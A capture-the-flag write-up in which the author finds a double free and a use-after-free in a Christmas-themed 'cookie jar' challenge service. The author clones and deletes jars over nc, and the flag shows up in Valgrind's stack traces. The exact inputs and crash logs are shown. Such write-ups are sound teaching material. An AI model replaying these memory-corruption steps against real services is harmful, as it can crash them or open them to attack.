

---

This one was weird. I don't know what the intended solution was, but it probably wasn't what we did. Because we solved it in three minutes and as many `nc` calls (the first of which crashed after attempting the obvious but unnecessary buffer overflow). See `cookies.txt` for our _entire_ interaction with this challenge. **We got first blood on this one!**

<!--(Note to self: 2019-12-15 18-31-41.mov from ~27 on)-->

After solving the Hashed Presents challenge, we had a look at the freshly released ones. I picked an unsolved one (going for gold stars baby!) and we took a look (still screensharing with Kris). Delayed by some technical VM difficulties, we eventually were greeted with this:

```
root@kali47:~/ctfxmas2019/symbols# nc challs.xmas.htsp.ro 13012
==40== Memcheck, a memory error detector
==40== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
==40== Using Valgrind-3.14.0 and LibVEX; rerun with -h for copyright info
==40== Command: /chall
==40==
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
```

Ok, we're in memcheck while interacting with the challenge executable. Clearly, some memory corruption weirdness will be the goal here.
Let's start off nice and create a cookie jar before we do anything else (I'll prefix my input with `> ` for clarity):

```
> 1
How long should the label be?
```

Um... We're heading straight to buffer overflow town? This early?

```
> 10
And what should we write on the label?
```

Well, might as well see what happens...

```
> aaaaaaaaaabbbbbccccc
Your cookie jar was put on shelf 0
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
==40== Conditional jump or move depends on uninitialised value(s)
==40==    at 0x108E3C: choice (in /chall)
==40==    by 0x108EB3: main (in /chall)
==40==
==40== Conditional jump or move depends on uninitialised value(s)
==40==    at 0x108E55: choice (in /chall)
==40==    by 0x108EB3: main (in /chall)
==40==
==40== Conditional jump or move depends on uninitialised value(s)
==40==    at 0x108E6E: choice (in /chall)
==40==    by 0x108EB3: main (in /chall)
==40==
==40==
==40== HEAP SUMMARY:
==40==     in use at exit: 20 bytes in 2 blocks
==40==   total heap usage: 4 allocs, 2 frees, 8,212 bytes allocated
==40==
==40== LEAK SUMMARY:
==40==    definitely lost: 0 bytes in 0 blocks
==40==    indirectly lost: 0 bytes in 0 blocks
==40==      possibly lost: 0 bytes in 0 blocks
==40==    still reachable: 20 bytes in 2 blocks
==40==         suppressed: 0 bytes in 0 blocks
==40== Rerun with --leak-check=full to see details of leaked memory
==40==
==40== For counts of detected and suppressed errors, rerun with: -v
==40== Use --track-origins=yes to see where uninitialised values come from
==40== ERROR SUMMARY: 3 errors from 3 contexts (suppressed: 0 from 0)
```

I guess we overflowed something. First guess is we overflowed the return address of something (in retrospect that's likely wrong - or at least doesn't match "conditional jump or move depends on uninitialized value"). 20 bytes still reachable - probably the ones we wrote? There isn't too much else in this output, so let's not think too hard about it.

Kris suggested throwing the binary into Ghidra, but I really didn't feel like reversing it and exploiting the buffer overflow. That sounded tedious. I was about ready to chase another flag, but decided "let's play with it a little bit more... In a clean way though". So, second `nc`:

```
root@kali47:~/ctfxmas2019/symbols# nc challs.xmas.htsp.ro 13012
==42== Memcheck, a memory error detector
==42== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
==42== Using Valgrind-3.14.0 and LibVEX; rerun with -h for copyright info
==42== Command: /chall
==42== 
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
> 2
Shelf id please:
> 1
Illegal move, kid!
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
> 3
Give index of source jar and destination jar
> 1
> 1
Source and destination must be existing jars, cheater!
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
```

I tried trashing or cloning a jar before actually creating one, and at least _those_ inputs are mildly sanitized. Let's try being nice again:

```
> 1
How long should the label be?
> 10 
And what should we write on the label?
> flag
Your cookie jar was put on shelf 0
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
> 1
How long should the label be?
> 10
And what should we write on the label?
> flag1
Your cookie jar was put on shelf 1
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
```

So far so good. Now, this whole thing is about memory corruption. If you are active in the C++ tag on StackOverflow (I am), you know exactly which memory corruption a programmer first toying with objects and memory management in C++ will fall prey to: Rule of three violations. In short: If your class holds a pointer to some resource (e.g. some memory containing a cookie jar label string) and you write a destructor that releases that resource, your program now has a bug: The compiler-generated copy constructor will happily copy that pointer, so you now have two objects that will each (attempt to) destroy that memory in their destructor.

This challenge just screamed "rule of three violation" to me. So that's exactly what I tried next: Copy an object, then delete the original and the copy:

```
> 3
Give index of source jar and destination jar
> 1
> 0
Jar 1 was cloned into jar 0
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
> 2
Shelf id please:
> 1
Cookie jar on shelf 1 was disposed of
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
> 2
Shelf id please: 0
==42== Invalid free() / delete / delete[] / realloc()
==42==    at 0x48369AB: free (vg_replace_malloc.c:530)
==42==    by 0x108C5F: braceN4ugh7y_K1d5 (in /chall)
==42==    by 0x108E60: choice (in /chall)
==42==    by 0x108EB3: main (in /chall)
==42==  Address 0x4a0d1b0 is 0 bytes inside a block of size 12 free'd
==42==    at 0x48369AB: free (vg_replace_malloc.c:530)
==42==    by 0x108C5F: braceN4ugh7y_K1d5 (in /chall)
==42==    by 0x108E60: choice (in /chall)
==42==    by 0x108EB3: main (in /chall)
==42==  Block was alloc'd at
==42==    at 0x483577F: malloc (vg_replace_malloc.c:299)
==42==    by 0x108B19: XdashMAS (in /chall)
==42==    by 0x108E47: choice (in /chall)
==42==    by 0x108EB3: main (in /chall)
==42== 
Cookie jar on shelf 0 was disposed of
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
```

Yep, double free, here we go! That's exactly what a rule of three violation would look like.

Wait, what's that? `XdashMAS` and `braceN4ugh7y_K1d5`? It's not a whole flag, but it's definitely two thirds of a flag. There's more functions to discover (the closing `brace` is missing), but let's start from a clean slate again. I knew exactly what the next step would be: "This time I'm going to clone, then delete the original, then clone and see what happens after that."

```
root@kali47:~/ctfxmas2019/symbols# nc challs.xmas.htsp.ro 13012
==44== Memcheck, a memory error detector
==44== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
==44== Using Valgrind-3.14.0 and LibVEX; rerun with -h for copyright info
==44== Command: /chall
==44== 
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
> 1
How long should the label be?
> 10
And what should we write on the label?
> flag
Your cookie jar was put on shelf 0
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
> 1
How long should the label be?
> 10
And what should we write on the label?
> flag1
Your cookie jar was put on shelf 1
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
> 3
Give index of source jar and destination jar
> 1
> 0
Jar 1 was cloned into jar 0
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
> 2
Shelf id please: 1
Cookie jar on shelf 1 was disposed of
Santa's Cookie Maleficarium
1. Get a new cookie jar
2. Trash a cookie jar
3. Clone a cookie jar
4. Exit
> 3
Give index of source jar and destination jar
> 0
> 1 
==44== Invalid read of size 1
==44==    at 0x4838C62: strlen (vg_replace_strmem.c:460)
==44==    by 0x108D5C: _G37_V4lgr1nd_3rr0r5brace (in /chall)
==44==    by 0x108E79: choice (in /chall)
==44==    by 0x108EB3: main (in /chall)
==44==  Address 0x4a0d1b0 is 0 bytes inside a block of size 12 free'd
==44==    at 0x48369AB: free (vg_replace_malloc.c:530)
==44==    by 0x108C5F: braceN4ugh7y_K1d5 (in /chall)
==44==    by 0x108E60: choice (in /chall)
==44==    by 0x108EB3: main (in /chall)
==44==  Block was alloc'd at
==44==    at 0x483577F: malloc (vg_replace_malloc.c:299)
==44==    by 0x108B19: XdashMAS (in /chall)
==44==    by 0x108E47: choice (in /chall)
==44==    by 0x108EB3: main (in /chall)
==44== 
==44== Invalid read of size 1
==44==    at 0x4838C74: strlen (vg_replace_strmem.c:460)
==44==    by 0x108D5C: _G37_V4lgr1nd_3rr0r5brace (in /chall)
==44==    by 0x108E79: choice (in /chall)
==44==    by 0x108EB3: main (in /chall)
==44==  Address 0x4a0d1b1 is 1 bytes inside a block of size 12 free'd
==44==    at 0x48369AB: free (vg_replace_malloc.c:530)
==44==    by 0x108C5F: braceN4ugh7y_K1d5 (in /chall)
==44==    by 0x108E60: choice (in /chall)
==44==    by 0x108EB3: main (in /chall)
==44==  Block was alloc'd at
==44==    at 0x483577F: malloc (vg_replace_malloc.c:299)
==44==    by 0x108B19: XdashMAS (in /chall)
==44==    by 0x108E47: choice (in /chall)
==44==    by 0x108EB3: main (in /chall)
==44== 
==44== Invalid read of size 1
==44==    at 0x48392F1: __strncpy_sse2_unaligned (vg_replace_strmem.c:554)
==44==    by 0x108D99: _G37_V4lgr1nd_3rr0r5brace (in /chall)
==44==    by 0x108E79: choice (in /chall)
==44==    by 0x108EB3: main (in /chall)
==44==  Address 0x4a0d1b0 is 0 bytes inside a block of size 12 free'd
==44==    at 0x48369AB: free (vg_replace_malloc.c:530)
==44==    by 0x108C5F: braceN4ugh7y_K1d5 (in /chall)
==44==    by 0x108E60: choice (in /chall)
==44==    by 0x108EB3: main (in /chall)
==44==  Block was alloc'd at
==44==    at 0x483577F: malloc (vg_replace_malloc.c:299)
==44==    by 0x108B19: XdashMAS (in /chall)
==44==    by 0x108E47: choice (in /chall)
==44==    by 0x108EB3: main (in /chall)
==44== 
==44== Invalid write of size 1
==44==    at 0x483932B: __strncpy_sse2_unaligned (vg_replace_strmem.c:554)
==44==    by 0x108D99: _G37_V4lgr1nd_3rr0r5brace (in /chall)
==44==    by 0x108E79: choice (in /chall)
==44==    by 0x108EB3: main (in /chall)
==44==  Address 0x0 is not stack'd, malloc'd or (recently) free'd
==44== 
==44== 
==44== Process terminating with default action of signal 11 (SIGSEGV): dumping core
==44==  Access not within mapped region at address 0x0
==44==    at 0x483932B: __strncpy_sse2_unaligned (vg_replace_strmem.c:554)
==44==    by 0x108D99: _G37_V4lgr1nd_3rr0r5brace (in /chall)
==44==    by 0x108E79: choice (in /chall)
==44==    by 0x108EB3: main (in /chall)
==44==  If you believe this happened as a result of a stack
==44==  overflow in your program's main thread (unlikely but
==44==  possible), you can try to increase the size of the
==44==  main thread stack using the --main-stacksize= flag.
==44==  The main thread stack size used in this run was 8388608.
==44== 
==44== HEAP SUMMARY:
==44==     in use at exit: 28 bytes in 2 blocks
==44==   total heap usage: 6 allocs, 4 frees, 8,240 bytes allocated
==44== 
==44== LEAK SUMMARY:
==44==    definitely lost: 12 bytes in 1 blocks
==44==    indirectly lost: 0 bytes in 0 blocks
==44==      possibly lost: 0 bytes in 0 blocks
==44==    still reachable: 16 bytes in 1 blocks
==44==         suppressed: 0 bytes in 0 blocks
==44== Rerun with --leak-check=full to see details of leaked memory
==44== 
==44== For counts of detected and suppressed errors, rerun with: -v
==44== ERROR SUMMARY: 9 errors from 4 contexts (suppressed: 0 from 0)
```

And... that's it!? All the flag pieces in the same call stack? After trying the most obvious steps to breaking a program with presumed rule of three violations? I mean, I won't complain, but it's now a day later and only two other teams have found this flag. I guess everybody gets hung up on the buffer overflow (+ provided binary) red herring? Or was some buffer overflow really how you were supposed to solve it and the exploiting above was unintended?

```
XdashMAS braceN4ugh7y_K1d5 _G37_V4lgr1nd_3rr0r5brace
```

*During the writeup I noticed that the pieces don't fit together to "rule of three violation" quite as well as I thought while capturing this flag. For starters, there wouldn't be a `strlen` called in the compiler-generated copy constructor. But ultimately, if you ignore the buffer overflow, the last two program runs were literally the most obvious ways to break this program, and I'm still baffled that this lets you get the flag within three minutes of `nc`.*
